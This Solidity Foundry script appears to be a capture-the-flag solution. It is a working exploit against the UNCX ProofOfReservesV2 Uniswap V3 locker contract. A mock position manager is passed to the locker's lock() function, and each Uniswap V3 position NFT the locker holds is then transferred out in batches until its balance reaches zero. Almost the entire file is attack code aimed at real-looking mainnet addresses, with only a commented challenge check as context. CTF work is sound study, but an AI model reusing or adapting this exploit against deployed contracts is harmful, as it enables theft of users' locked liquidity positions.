// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/Script.sol";

import {ICountryList} from "../src/ICountryList.sol";
import {IUNCX_ProofOfReservesV2_UniV3, INonfungiblePositionManager, UNCX_ProofOfReservesV2_UniV3} from "../src/UNCX_ProofOfReservesV2_UniV3.sol";



interface IERC721 {
    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function balanceOf(address owner) external view returns (uint256 balance);
}

contract MockTool {
    address public token0_ = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address public token1_ = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;

    uint256 public targetId=0;
    function factory() external view returns (address) {
        return address(this);
    }

    function getPool(address _token0, address _token1, uint24 _fee) external view returns (address){
        return address(this);
    }

    function positions(uint256 tokenId)
    external
    view
    returns (
        uint96 nonce,
        address operator,
        address token0,
        address token1,
        uint24 fee,
        int24 tickLower,
        int24 tickUpper,
        uint128 liquidity,
        uint256 feeGrowthInside0LastX128,
        uint256 feeGrowthInside1LastX128,
        uint128 tokensOwed0,
        uint128 tokensOwed1
    ) {
        console.log("positions");
        token0 = token0_;
        token1 = token1_;

        //tickUpper = 887250;
    }


    function changeTarget(uint256 target) public {
        targetId = target;
    }

    function decreaseLiquidity(INonfungiblePositionManager.DecreaseLiquidityParams calldata params)
    external
    payable
    returns (uint256 amount0, uint256 amount1) {
        return (0,0);
    }

    function collect(INonfungiblePositionManager.CollectParams calldata params) external payable returns (uint256 amount0, uint256 amount1) {
        return (targetId,targetId);
    }

    function feeAmountTickSpacing(uint24 fee) external view returns (int24){
        return 50;
    }

    function safeTransferFrom(address a, address b, uint256 nft_id) external payable {
        console.log("mock - safeTransferFrom");
    }

    function finish(uint256 tokenId) public {
        IERC721(token0_).transferFrom(0x7f5C649856F900d15C83741f45AE46f5C6858234, address(this), tokenId);
    }

    function mint(INonfungiblePositionManager.MintParams calldata params)
    external
    payable
    returns (
        uint256 tokenId,
        uint128 liquidity,
        uint256 amount0,
        uint256 amount1
    ) {
        amount0 = type(uint256).max;
        amount1 = type(uint256).max;
    }
    function burn(uint256 tokenId) external payable {}
}

contract Solve is Script {
    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();
        Attacker at = Attacker(0xe9c784d6b88c6756DeB223546Ad6f369D25f1e13);
        //at.ready();
        //at.run(0,10);
        //at.run(10,20);
        /*at.run(20,30);
        at.run(30,40);
        at.run(40,50);*/
        //at.run(50,60);
        //at.run(60,70);
        at.run(70,79);
        vm.stopBroadcast();
    }
}

contract Attacker {
    mapping(uint256=>uint256) public ids;
    uint256 count=0;
    MockTool public mt;
    function ready() public {
        uint256 token_count = IERC721(0xC36442b4a4522E871399CD717aBDD847Ab11FE88).balanceOf(0x7f5C649856F900d15C83741f45AE46f5C6858234);
        //uint256[] memory ids = new uint256[](token_count);

        for(uint i=0;i<token_count;i++){
            uint256 tokenId = IERC721(0xC36442b4a4522E871399CD717aBDD847Ab11FE88).tokenOfOwnerByIndex(0x7f5C649856F900d15C83741f45AE46f5C6858234, i);
            ids[i] = tokenId;
            count+=1;
        }

        mt = new MockTool();
    }

    function run(uint start, uint end) public {
        uint256 prevBalance = IERC721(0xC36442b4a4522E871399CD717aBDD847Ab11FE88).balanceOf(0x7f5C649856F900d15C83741f45AE46f5C6858234);

        UNCX_ProofOfReservesV2_UniV3 target = UNCX_ProofOfReservesV2_UniV3(0x7f5C649856F900d15C83741f45AE46f5C6858234);
        for(uint j=start;j<end;j++){
            console.log("tokenId : %d, i : %d", ids[j], j);
            IUNCX_ProofOfReservesV2_UniV3.LockParams memory lParam;
            lParam.nftPositionManager = INonfungiblePositionManager(address(mt));
            lParam.nft_id = ids[j];
            lParam.dustRecipient = address(0x3333);
            lParam.owner = address(0x3333);
            lParam.additionalCollector = address(0x3333);
            lParam.collectAddress = address(0x4444);
            lParam.unlockDate = block.timestamp*2;
            lParam.countryCode = 0;
            lParam.feeName = "DEFAULT";
            mt.changeTarget(ids[j]);
            target.lock(lParam);
            mt.finish(ids[j]);
        }

        /*
            contract Challenge {
                address private immutable TARGET = 0x7f5C649856F900d15C83741f45AE46f5C6858234;
                IERC721 private immutable UNI_V3 = IERC721(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);

                function isSolved() external view returns (bool) {
                    return UNI_V3.balanceOf(TARGET) == 0;
                }
            }
        */
        uint256 curBalance = IERC721(0xC36442b4a4522E871399CD717aBDD847Ab11FE88).balanceOf(0x7f5C649856F900d15C83741f45AE46f5C6858234);
        console.log("prev : %d, current : %d", prevBalance, curBalance);
    }
}